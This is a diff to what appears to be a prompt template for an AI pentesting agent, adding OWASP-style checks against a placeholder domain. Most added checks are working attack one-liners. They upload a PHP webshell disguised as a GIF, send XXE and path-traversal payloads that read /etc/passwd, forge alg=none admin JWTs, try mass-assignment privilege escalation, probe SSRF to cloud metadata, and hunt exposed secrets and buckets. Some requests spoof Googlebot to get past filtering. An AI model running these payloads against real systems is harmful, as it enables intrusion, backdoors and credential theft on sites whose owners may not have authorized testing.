@@ -564,8 +564,23 @@ for p in /api /graphql /api/v1 /api/v2 /v1 /v2 /rest /swagger.json /openapi.json
 # Port scan — no -sV so it finishes in <30s
 nmap -Pn -n --host-timeout 60s -T4 -p 80,443,8080,8443,3000,4000,5000,9000 {{domain}} 2>/dev/null | head -20
 
+# Service/version detection on common ports
+nmap -Pn -n --host-timeout 60s -sV --version-intensity 3 -p 80,443,8080,8443,22,21,25,3306,5432,6379 {{domain}} 2>/dev/null | grep -E "open|VERSION|Service" | head -20
+
 # CDN/proxy header detection
 curl -4 -sI https://{{domain}}/ --max-time 12 -A "{_UA}" | grep -iE "via|x-cache|cf-ray|x-amz|x-varnish|fastly|akamai|cloudflare|x-vercel|x-netlify|x-hcdn|platform|panel|age"
+
+══════════════════════════════════════════════════════════
+[SCAN-VULN] Vulnerability Scan — full nuclei template suite
+══════════════════════════════════════════════════════════
+# Run comprehensive nuclei scan covering CVEs, misconfigurations, and exposures
+nuclei_scan(
+  target="https://{{domain}}",
+  templates="cves,vulnerabilities,misconfiguration,exposures,technologies,default-logins,takeovers",
+  severity="info,low,medium,high,critical"
+)
+# whatweb for additional fingerprinting (version strings, plugins)
+whatweb -a 3 --colour=never https://{{domain}}/ 2>/dev/null | head -20 || whatweb -a 1 --colour=never http://{{domain}}/ 2>/dev/null | head -10 || echo "(whatweb not available)"
 
 ══════════════════════════════════════════════════════════
 FINAL OUTPUT — format as this exact table structure:
@@ -614,10 +629,26 @@ Call this tool immediately, before any other check:
 - After Nuclei completes, run the manual CONF checks below to investigate
   further and validate any High/Critical findings.
 
-[CONF-01] Test Network Infrastructure Configuration
+[CONF-01] Test Network Infrastructure Configuration — HTTP Security Headers
+  # Full security header audit (all OWASP-recommended headers)
+  curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -iE "strict-transport-security|x-frame-options|x-content-type-options|content-security-policy|x-xss-protection|referrer-policy|permissions-policy|cross-origin|cache-control"
+  # Score each header: present=pass, missing=finding. Missing CSP/HSTS = Medium. Missing X-Frame-Options = Medium (clickjacking).
+  python3 -c "import subprocess; ua='{_BUA}'; hdrs=subprocess.run(['curl','-L','-4','-sI','--max-time','12','--connect-timeout','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt','https://{{domain}}/'],capture_output=True,text=True,timeout=16).stdout.lower(); checks=[('Strict-Transport-Security','hsts'),('Content-Security-Policy','content-security-policy'),('X-Frame-Options','x-frame-options'),('X-Content-Type-Options','x-content-type-options'),('Referrer-Policy','referrer-policy'),('Permissions-Policy','permissions-policy')]; [print('MISSING HEADER:',name,'(Medium)') for name,key in checks if key not in hdrs]"
   nmap -Pn --script ssl-cert,ssl-enum-ciphers -p 443 {{domain}} 2>/dev/null | head -40
-  curl -L -4 -sk https://{{domain}}/.well-known/security.txt -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null
-  curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -iE "strict-transport-security|x-frame-options|x-content-type|content-security-policy|x-xss-protection"
+
+[CONF-02] Exposed Admin Panels & Management Interfaces
+  python3 -c "import subprocess; ua='{_BUA}'; panels=['/admin','/admin/','/admin/login','/admin/dashboard','/wp-admin','/wp-admin/','/.wp-admin','/administrator','/administrator/index.php','/cpanel','/webmail','/phpmyadmin','/pma','/phpMyAdmin','/phpmyadmin/','/myadmin','/db','/database','/adminer','/adminer.php','/panel','/controlpanel','/manager','/management','/console','/jmx-console','/web-console','/server-manager','/server-status','/server-info','/nginx_status','/status','/health','/actuator','/actuator/env','/actuator/mappings','/actuator/beans','/jenkins','/grafana','/kibana','/elasticsearch','/solr','/rabbitmq']; run=lambda p: subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}}','-A',ua,'--max-time','7','--connect-timeout','5','https://{{domain}}'+p],capture_output=True,text=True,timeout=10).stdout.strip(); [print('ADMIN PANEL EXPOSED:',p,'HTTP',c) for p in panels for c in [run(p)] if c not in ('404','403','410','000','')]"
+
+[CONF-03] Cloud Storage Misconfiguration
+  python3 -c "import subprocess,json; domain='{{domain}}'; parts=domain.split('.'); company=parts[0]; names=[company,company+'-backup',company+'-data',company+'-assets',company+'-uploads',company+'-static',company+'-media',company+'-files',company+'-dev',company+'-staging',company+'-prod']; run=lambda u: subprocess.run(['curl','-L','-4','-sk','-o','/dev/null','-w','%{{http_code}}','--max-time','8',u],capture_output=True,text=True,timeout=12).stdout.strip(); buckets=[('S3','https://'+n+'.s3.amazonaws.com/') for n in names]+[('S3','https://s3.amazonaws.com/'+n+'/') for n in names]+[('GCS','https://storage.googleapis.com/'+n+'/') for n in names]+[('Azure','https://'+n+'.blob.core.windows.net/') for n in names]; [print('CLOUD STORAGE EXPOSED:',provider,u,'HTTP',c) for provider,u in buckets for c in [run(u)] if c in ('200','301','302')]"
+
+[CONF-04] DNS Zone Transfer
+  python3 -c "import subprocess; domain='{{domain}}'; ns_raw=subprocess.run(['dig','+short','NS',domain],capture_output=True,text=True,timeout=10).stdout.strip().splitlines(); ns=[n.rstrip('.') for n in ns_raw if n]; print('Nameservers:',ns); [print('[AXFR via '+n+']:', subprocess.run(['dig','AXFR',domain,'@'+n],capture_output=True,text=True,timeout=15).stdout[:1000] or '(refused)') for n in ns[:3]]"
+
+[CONF-05] Open Redirect
+  python3 -c "import subprocess,urllib.parse; ua='{_BUA}'; target='https://evil-cfai-test.example.com'; params=['redirect','url','next','return','dest','goto','redir','target','continue','forward','r','to','returnUrl','return_url','callback','back','location']; run=lambda u: subprocess.run(['curl','-4','-sk','--max-time','8','-A',ua,'--max-redirs','0','-w','%{{url_effective}}','-o','/dev/null',u],capture_output=True,text=True,timeout=12).stdout; hits=[u for pr in params for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(target)] if 'evil-cfai-test.example.com' in run(u)]; [print('OPEN REDIRECT:',u) for u in hits] or print('(no open redirect on common params)')"
+  # Also test /login?next= and /logout?redirect= patterns
+  python3 -c "import subprocess,urllib.parse; ua='{_BUA}'; target='https://evil-cfai-test.example.com'; paths=[('/login','next'),('/logout','redirect'),('/auth/callback','redirect_uri'),('/oauth/authorize','redirect_uri'),('/sso','return')]; run=lambda u: subprocess.run(['curl','-4','-sk','--max-time','8','-A',ua,'--max-redirs','0','-w','%{{url_effective}}','-o','/dev/null',u],capture_output=True,text=True,timeout=12).stdout; [print('OPEN REDIRECT:',path+'?'+param+'='+target) for path,param in paths if 'evil-cfai-test.example.com' in run('https://{{domain}}'+path+'?'+param+'='+urllib.parse.quote(target))]"
 
 [CONF-10] Test for Subdomain Takeover
   subfinder -d {{domain}} -silent 2>/dev/null | head -30 || echo "(subfinder not available)"
@@ -781,6 +812,18 @@ CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare retu
   curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Referer: https://www.google.com/" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -iEo "(oauth|openid|auth0|okta|google.*login|facebook.*login|/.well-known/openid-configuration)" | sort -u
   for p in /.well-known/openid-configuration /oauth/authorize /oauth/token /auth/google /auth/facebook /auth/github; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}$p -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null); [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code $p"; done
 
+[ATHZ-MASS] Mass Assignment
+  # Attempt to set privileged fields during user update/registration
+  python3 -c "import subprocess; ua='{_BUA}'; payloads=['{{"role":"admin","is_admin":true,"admin":1,"privilege":"superuser","group":"admin","permissions":["admin"]}}','{{"role":"admin"}}','{{"is_admin":true}}','{{"privilege":"superuser"}}']; eps=['/api/user/update','/api/v1/user/update','/api/users/me','/api/v1/users/me','/api/profile','/api/v1/profile','/api/account','/api/v1/account']; [print(subprocess.run(['curl','-L','-4','-si','-X','PUT','https://{{domain}}'+ep,'-H','Content-Type: application/json','-A',ua,'--max-time','10','-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt','-d',pl],capture_output=True,text=True,timeout=14).stdout[:200]) for ep in eps for pl in payloads[:2]]"
+  # Mass assignment via registration — inject role/admin field into signup body
+  curl -L -4 -si -X POST https://{{domain}}/api/register -H "Content-Type: application/json" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -d '{{"username":"cfai_masstest","email":"cfai_mass@mailinator.com","password":"Test1234!","role":"admin","is_admin":true}}' --max-time 12 2>/dev/null | head -15
+
+[ATHZ-RBAC] Role-Based Access Control Verification
+  # Test unauthenticated access to role-gated endpoints
+  python3 -c "import subprocess; ua='{_BUA}'; role_eps=['/api/admin','/api/admin/users','/api/admin/settings','/api/admin/logs','/api/v1/admin','/dashboard/admin','/admin/api/users','/api/users','/api/roles','/api/permissions']; run=lambda p: subprocess.run(['curl','-L','-4','-si','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt','https://{{domain}}'+p],capture_output=True,text=True,timeout=12); [print('UNAUTH ACCESS:',p,r.stdout[:100]) for p in role_eps for r in [run(p)] if r.stdout and any(x in r.stdout[:80] for x in ['200 OK','201 Cre','HTTP/1.1 2','HTTP/2 2'])]"
+  # Test horizontal RBAC — accessing another user's resources without ownership
+  python3 -c "import subprocess; ua='{_BUA}'; user_eps=['/api/user/1','/api/v1/user/1','/api/users/1','/api/user/2','/api/v1/user/2','/api/profile/1','/api/account/1','/api/orders/1','/api/invoice/1']; run=lambda p: subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}}','-A',ua,'--max-time','7','https://{{domain}}'+p],capture_output=True,text=True,timeout=10).stdout.strip(); [print('RBAC EXPOSURE:',p,'->',c) for p in user_eps for c in [run(p)] if c in ('200','201')]"
+
 After all checks, produce the final report using the OUTPUT FORMAT from RULES:
 - Detailed report blocks for confirmed Medium/High/Critical findings
 - Table rows for Info/Low findings
@@ -824,6 +867,43 @@ CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare retu
 [SESS-10] JSON Web Tokens (JWT)
   curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -Eo "eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+" | head -3
   for ep in /api /api/v1 /api/auth /api/token; do curl -L -4 -sI https://{{domain}}$ep -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null | grep -iE "authorization|bearer|jwt" | head -2; done
+  # JWT none-algorithm bypass — hardcoded base64url tokens (alg=none, sub=1, role=admin)
+  python3 -c "import subprocess,base64,json,time; ua='{_BUA}'; hdr=base64.urlsafe_b64encode(json.dumps(dict(alg='none',typ='JWT')).encode()).rstrip(b'=').decode(); pay=base64.urlsafe_b64encode(json.dumps(dict(sub='1',role='admin',iat=int(time.time()))).encode()).rstrip(b'=').decode(); none_jwt=hdr+'.'+pay+'.'; eps=['/api/me','/api/v1/me','/api/profile','/api/admin','/api/user']; [print('JWT-NONE:',ep,subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}}','-H','Authorization: Bearer '+none_jwt,'-A',ua,'--max-time','8','https://{{domain}}'+ep],capture_output=True,text=True,timeout=12).stdout.strip()) for ep in eps]"
+
+[SESS-ENTROPY] Session Token Entropy Analysis
+  # Collect 5 session tokens and measure randomness
+  python3 -c "
+import subprocess,re,math,collections
+ua='{_BUA}'
+tokens=[]
+for i in range(5):
+    r=subprocess.run(['curl','-L','-4','-sI','--max-time','10','-A',ua,'-c','/tmp/sess_entropy_'+str(i)+'.txt','-b','/tmp/sess_entropy_'+str(i)+'.txt','https://{{domain}}/'],capture_output=True,text=True,timeout=14)
+    for line in r.stdout.splitlines():
+        if 'set-cookie' in line.lower():
+            m=re.search(r'(?:session|sess|token|PHPSESSID|JSESSIONID|laravel_session|__Secure-[^=]*)=([A-Za-z0-9%._-]+)',line,re.I)
+            if m: tokens.append(m.group(1))
+if tokens:
+    print('Tokens collected:',tokens[:5])
+    avg_len=sum(len(t) for t in tokens)/len(tokens)
+    print('Average length:',avg_len,'chars')
+    if avg_len < 16: print('LOW ENTROPY: token shorter than 128 bits — MEDIUM finding')
+    all_chars=''.join(tokens)
+    freq=collections.Counter(all_chars)
+    entropy=-sum((c/len(all_chars))*math.log2(c/len(all_chars)) for c in freq.values())
+    print('Shannon entropy per char:',round(entropy,2),'bits')
+    if entropy < 3.5: print('LOW ENTROPY: token has low randomness — possible predictability')
+    unique=len(set(tokens))
+    if unique < len(tokens): print('DUPLICATE TOKENS DETECTED — session fixation risk')
+else:
+    print('(no session cookies detected on homepage)')
+"
+
+[SESS-CONCURRENT] Concurrent Session Management
+  # Test if two simultaneous sessions are allowed (collect two separate cookies)
+  python3 -c "import subprocess,re; ua='{_BUA}'; get_cookie=lambda f: subprocess.run(['curl','-L','-4','-sI','--max-time','10','-A',ua,'-c',f,'-b',f,'https://{{domain}}/login'],capture_output=True,text=True,timeout=14).stdout; c1=get_cookie('/tmp/sess_c1.txt'); c2=get_cookie('/tmp/sess_c2.txt'); tok=lambda h: re.search(r'set-cookie:\\s*([\\w_-]+=\\S+)',h,re.I); t1=tok(c1); t2=tok(c2); print('Session 1:',t1.group(1)[:40] if t1 else '(none)'); print('Session 2:',t2.group(1)[:40] if t2 else '(none)'); print('Different tokens:',t1 and t2 and t1.group(1)!=t2.group(1))"
+  # After logout, verify session 1 token is invalidated
+  curl -L -4 -so /dev/null -w "Logout status: %{{http_code}}\n" https://{{domain}}/logout -A "{_BUA}" -b /tmp/sess_c1.txt --max-time 10 2>/dev/null
+  curl -L -4 -so /dev/null -w "Post-logout access: %{{http_code}}\n" https://{{domain}}/api/me -A "{_BUA}" -b /tmp/sess_c1.txt --max-time 10 2>/dev/null
 
 After all checks, produce the final report using the OUTPUT FORMAT from RULES:
 - Detailed report blocks for confirmed Medium/High/Critical findings
@@ -892,6 +972,48 @@ WAF BYPASS: If you get 403/429 responses, the target has a WAF. Before retrying:
 [INPV-19] Server-Side Request Forgery (SSRF)
   python3 -c "import subprocess,urllib.parse; ua='{_BUA}'; params=['url','path','redirect','uri','dest','target','src','callback','webhook','fetch','proxy']; dsts=['http://169.254.169.254/latest/meta-data/','http://127.0.0.1/','http://localhost/']; run=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout; [print('SSRF HIT:',u) for pr in params for dst in dsts for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(dst)] if any(x in run(u) for x in ['ami-id','instance-id','local-ipv4','root:x:0'])]"
 
+[INPV-XXE] XML External Entity Injection
+  # Test XML-accepting endpoints for XXE (file read via entity expansion)
+  python3 -c "
+import subprocess,urllib.parse
+ua='{_BUA}'
+xxe_body='''<?xml version=\"1.0\" encoding=\"UTF-8\"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
+<root><data>&xxe;</data></root>'''
+eps=['/api/upload','/api/v1/upload','/api/import','/api/xml','/api/parse','/upload','/import','/api/v1/parse','/api/data']
+for ep in eps:
+    r=subprocess.run(['curl','-L','-4','-si','-X','POST','https://{{domain}}'+ep,'-H','Content-Type: application/xml','-A',ua,'--max-time','10','-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt','--data-raw',xxe_body],capture_output=True,text=True,timeout=14)
+    if 'root:x:0' in r.stdout or 'root:!' in r.stdout:
+        print('XXE CONFIRMED:',ep,'— /etc/passwd read succeeded')
+        print(r.stdout[:300])
+    elif r.stdout and '200' in r.stdout[:20]:
+        print('XXE candidate (200 response):',ep)
+"
+  # SOAP endpoint XXE test
+  python3 -c "import subprocess; ua='{_BUA}'; soap='''<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body><test>&xxe;</test></soapenv:Body></soapenv:Envelope>'''; r=subprocess.run(['curl','-L','-4','-si','-X','POST','https://{{domain}}/api/soap','-H','Content-Type: text/xml','-H','SOAPAction: test','-A',ua,'--max-time','10','--data-raw',soap],capture_output=True,text=True,timeout=14); print('SOAP XXE:','CONFIRMED' if 'root:x:0' in r.stdout else r.stdout[:100])"
+
+[INPV-UPLOAD] Malicious File Upload
+  # Discover upload endpoints
+  python3 -c "import subprocess; ua='{_BUA}'; eps=['/upload','/api/upload','/api/v1/upload','/file/upload','/files/upload','/media/upload','/avatar','/profile/photo','/api/files','/import','/api/import']; run=lambda p: subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}}','-A',ua,'--max-time','7','--connect-timeout','5','https://{{domain}}'+p],capture_output=True,text=True,timeout=10).stdout.strip(); [print('UPLOAD ENDPOINT:',p,'HTTP',c) for p in eps for c in [run(p)] if c not in ('404','405','410','000','')]"
+  # Upload PHP webshell as image (bypass content-type check)
+  python3 -c "
+import subprocess,tempfile,os
+ua='{_BUA}'
+shell_content=b'GIF89a<?php system(\\$_GET[\"cmd\"]); ?>'
+with tempfile.NamedTemporaryFile(suffix='.php.gif',delete=False,mode='wb') as f:
+    f.write(shell_content); fname=f.name
+for ep in ['/upload','/api/upload','/avatar','/profile/photo']:
+    r=subprocess.run(['curl','-L','-4','-si','-X','POST','https://{{domain}}'+ep,'-H','Content-Type: multipart/form-data','-F','file=@'+fname+';type=image/gif','-F','filename=cfai_test.php.gif','-A',ua,'--max-time','12','-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt'],capture_output=True,text=True,timeout=16)
+    if r.stdout and any(x in r.stdout for x in ['url','path','filename','location','200 OK','HTTP/2 2']):
+        print('UPLOAD ACCEPTED:',ep); print(r.stdout[:300])
+os.unlink(fname)
+"
+  # Upload SVG with embedded XSS
+  python3 -c "import subprocess,tempfile,os; ua='{_BUA}'; svg=b'<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"><script>alert(1)</script></svg>'; f=tempfile.NamedTemporaryFile(suffix='.svg',delete=False,mode='wb'); f.write(svg); fname=f.name; f.close(); r=subprocess.run(['curl','-L','-4','-si','-X','POST','https://{{domain}}/upload','-F','file=@'+fname+';type=image/svg+xml','-A',ua,'--max-time','12','-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt'],capture_output=True,text=True,timeout=16); print('SVG upload:',r.stdout[:200]); os.unlink(fname)"
+
+[INPV-PATH] Path Traversal (File-Focused)
+  python3 -c "import subprocess,urllib.parse; ua='{_BUA}'; targets=['root:x:0:0','root:!:0:0','bin:x:1']; traversals=['../../../etc/passwd','../../etc/passwd','..%2f..%2f..%2fetc%2fpasswd','..%252f..%252f..%252fetc%252fpasswd','....//....//....//etc/passwd','/etc/passwd','%2fetc%2fpasswd']; params=['file','path','page','include','template','doc','document','dir','folder','load','read','view']; run=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout; [print('PATH TRAVERSAL:',pr,'->',t[:50]) for pr in params for t in traversals for u in ['https://{{domain}}/?'+pr+'='+t] for body in [run(u)] if any(x in body for x in targets)]"
+
 After all checks, produce the final report using the OUTPUT FORMAT from RULES:
 - Detailed report blocks for confirmed Medium/High/Critical findings
 - Table rows for Info/Low findings
@@ -913,12 +1035,36 @@ Every curl MUST have -L -4 -A "{_BUA}".
   curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -iE "strict-transport-security|hsts"
   python3 -c "import subprocess; ua='{_BUA}'; kw=('subject:','issuer:','expire date:','subjectaltname','start date:'); skip=('verification failed','self signed','self-signed','alert','warning'); getcert=lambda args: [l.strip('* ') for l in subprocess.run(args,capture_output=True,text=True,timeout=12).stderr.splitlines() if any(k in l.lower() for k in kw) and not any(s in l.lower() for s in skip)]; b=['curl','-L','-4','-vsk','--max-time','10','--connect-timeout','6']; tries=[b+['-A',ua,'-H','X-Forwarded-For: 66.249.66.1','-H','X-Real-IP: 66.249.66.1','-H','Referer: https://www.google.com/','https://{{domain}}/'],b+['-A',ua,'https://www.{{domain}}/'],b+['-A','Googlebot/2.1 (+http://www.google.com/bot.html)','-H','From: googlebot(at)googlebot.com','https://{{domain}}/'],b+['--http1.0','-A',ua,'https://{{domain}}/' ]]; found=next((r for a in tries for r in [getcert(a)] if r),[]); [print(l) for l in found[:20]] or print('[TLS FAIL] All 4 bypass attempts returned no cert data — VPS IP is filtered by the hosting provider, or domain has no HTTPS. Fix: try nmap --script ssl-cert -p 443 {{domain}}')"
 
+[CRYP-02] Certificate Validation
+  # Check certificate validity, expiry, and trust chain
+  python3 -c "import subprocess; out=subprocess.run('echo Q | timeout 10 openssl s_client -connect {{domain}}:443 -servername {{domain}} 2>/dev/null',shell=True,capture_output=True,text=True,timeout=14).stdout; [print(l) for l in out.splitlines() if any(k in l.lower() for k in ('subject','issuer','not before','not after','verify','error','cn=','san','depth'))]"
+  # Check for self-signed, expired, or wildcard certificates
+  python3 -c "import subprocess,re,datetime; raw=subprocess.run('echo Q | timeout 10 openssl s_client -connect {{domain}}:443 -servername {{domain}} 2>/dev/null | openssl x509 -noout -text 2>/dev/null',shell=True,capture_output=True,text=True,timeout=16).stdout; exp=re.search(r'Not After\\s*:\\s*(.+)',raw); san=re.search(r'DNS:(.+)',raw); print('Expiry:',exp.group(1).strip() if exp else 'unknown'); print('SAN:',san.group(0)[:80] if san else '(none)'); print('Self-signed:','YES — HIGH finding' if 'self signed' in raw.lower() or (exp and 'Issuer' in raw and re.search(r'Subject: (.+)',raw) and re.search(r'Issuer: (.+)',raw) and re.search(r'Subject: (.+)',raw).group(1)==re.search(r'Issuer: (.+)',raw).group(1)) else 'NO'); print('Wildcard:','YES' if '*.{{domain}}' in raw or 'DNS:*.' in raw else 'NO')"
+  # SSL Labs grade (cached)
+  curl -s "https://api.ssllabs.com/api/v3/analyze?host={{domain}}&fromCache=on&maxAge=24" --max-time 15 | python3 -m json.tool 2>/dev/null | grep -E "grade|ipAddress|status|errors" | head -10
+
 [CRYP-03] Sensitive Info over Unencrypted Channels
   code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" http://{{domain}}/ -A "{_BUA}" --max-time 10 2>/dev/null)
   loc=$(curl -L -4 -sI http://{{domain}}/ -A "{_BUA}" --max-time 10 2>/dev/null | grep -i "^location:")
   echo "HTTP: $code  $loc"
   curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -iE "strict-transport-security|hsts|includeSubDomains|preload"
   curl -L -4 -s http://{{domain}}/login -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | grep -iE "(action=.http:|method=.post)" | head -3
+
+[CRYP-04] Data at Rest — Exposed Sensitive Files
+  # Check for publicly accessible backup/config/database files
+  python3 -c "import subprocess; ua='{_BUA}'; paths=['.env','env.txt','.env.bak','.env.local','.env.production','config.php','config.ini','config.json','config.yaml','settings.py','database.yml','db.sqlite','dump.sql','backup.sql','db.sql','wp-config.php','wp-config.php.bak','wp-config.bak','application.properties','appsettings.json','web.config','credentials.json','secrets.json','private.key','id_rsa','.git/config','.git/HEAD','package.json','composer.json','Gemfile','requirements.txt','docker-compose.yml','.htpasswd','.htaccess']; run=lambda p: subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}}','-A',ua,'--max-time','7','--connect-timeout','5','https://{{domain}}/'+p],capture_output=True,text=True,timeout=10).stdout.strip(); [print('EXPOSED FILE:',p,'HTTP',c) for p in paths for c in [run(p)] if c not in ('404','403','410','000','')]"
+  # Check for .git directory exposure (source code leakage)
+  curl -L -4 -sk https://{{domain}}/.git/HEAD --max-time 8 -A "{_BUA}" 2>/dev/null | head -3
+  curl -L -4 -sk https://{{domain}}/.git/config --max-time 8 -A "{_BUA}" 2>/dev/null | head -10
+
+[CRYP-05] Key Management — Hardcoded/Exposed Keys
+  # Hunt for API keys and secrets in JS bundles
+  python3 -c "import subprocess,re; ua='{_BUA}'; html=subprocess.run(['curl','-L','-4','-sk','--max-time','15','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt','https://{{domain}}/'],capture_output=True,text=True,timeout=18).stdout; bundles=re.findall('src=[\"\\x27](/[^\"\\x27]+[.]js)[\"\\x27]',html)[:5]; patterns=[('AWS_KEY','AKIA[0-9A-Z]+'),('STRIPE','(sk|pk)_(live|test)_[0-9a-zA-Z]+'),('SENDGRID','SG[.][a-zA-Z0-9]+[.][a-zA-Z0-9]+'),('GITHUB_TOKEN','ghp_[a-zA-Z0-9]+'),('GOOGLE_API','AIza[0-9A-Za-z_-]+'),('PRIVATE_KEY','-----BEGIN [A-Z ]* PRIVATE KEY-----'),('JWT_SECRET','jwt.secret|JWT_SECRET|jwtSecret'),('SLACK_TOKEN','xox[baprs]-[0-9a-zA-Z-]+')]; [print('[KEY-FOUND]',name,'in',bundle,'->',m.group(0)[:40]) for bundle in bundles for js in [subprocess.run(['curl','-L','-4','-sk','--max-time','10','-A',ua,'https://{{domain}}'+bundle],capture_output=True,text=True,timeout=14).stdout] for name,pat in patterns for m in re.finditer(pat,js)]"
+  # Check environment variable exposure via debug endpoints
+  for ep in /api/env /api/debug /debug /env /api/config /api/settings /api/v1/debug; do
+    r=$(curl -L -4 -sk --max-time 8 -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt "https://{{domain}}$ep" 2>/dev/null)
+    echo "$r" | grep -iE "(secret|key|token|password|api_key|DATABASE_URL|REDIS_URL)" | head -5 && echo "[KEYS FOUND at $ep]" || true
+  done
 
 After all checks, produce the final report using the OUTPUT FORMAT from RULES:
 - Detailed report blocks for confirmed Medium/High/Critical findings
@@ -954,6 +1100,40 @@ CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare retu
 [CLNT-13] Cross-Site Script Inclusion
   curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -Eo 'src="https?://[^"]*[.]js[^"]*"' | head -15
   for ep in /api/jsonp /callback /json /data; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" "https://{{domain}}$ep?callback=test" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null); [ "$code" != "404" ] && echo "$code JSONP? $ep?callback=test"; done
+
+[CLNT-LIBS] Outdated JavaScript Library Detection
+  # Detect known vulnerable JS library versions from the page source
+  python3 -c "import subprocess,re; ua='{_BUA}'; html=subprocess.run(['curl','-L','-4','-sk','--max-time','15','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt','https://{{domain}}/'],capture_output=True,text=True,timeout=18).stdout; pats=[('jQuery','jquery[.-]([0-9]+[.][0-9]+[.][0-9]+)'),('Bootstrap','bootstrap[.-]([0-9]+[.][0-9]+[.][0-9]+)'),('Angular','angular[.-]([0-9]+[.][0-9]+[.][0-9]+)'),('React','react[.-]([0-9]+[.][0-9]+[.][0-9]+)'),('Vue','vue[.-]([0-9]+[.][0-9]+[.][0-9]+)'),('Lodash','lodash[.-]([0-9]+[.][0-9]+[.][0-9]+)'),('Moment.js','moment[.-]([0-9]+[.][0-9]+[.][0-9]+)'),('Underscore','underscore[.-]([0-9]+[.][0-9]+[.][0-9]+)')]; vulns=[('jQuery','< 3.5.0','XSS via htmlPrefilter CVE-2020-11022'),('Bootstrap','< 4.3.1','XSS in data-template CVE-2019-8331'),('Lodash','< 4.17.21','Prototype pollution CVE-2020-8203'),('Moment.js','< 2.29.4','ReDoS CVE-2022-31129')]; [print('[LIB]',lib,m.group(1)) or [print('  VULNERABLE:',lib,m.group(1),t,'->',v) for vl,t,v in vulns if vl==lib] for lib,pat in pats for m in [re.search(pat,html,re.I)] if m]"
+  # Also check Retire.js known vulnerable hashes (lightweight check via CDN URLs)
+  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -oE 'src="[^"]+[.]js[^"]*"' | grep -iE "(jquery|bootstrap|angular|react|vue|lodash|moment)" | head -10
+
+[CLNT-CLICK] Clickjacking Protection
+  # Check X-Frame-Options and CSP frame-ancestors
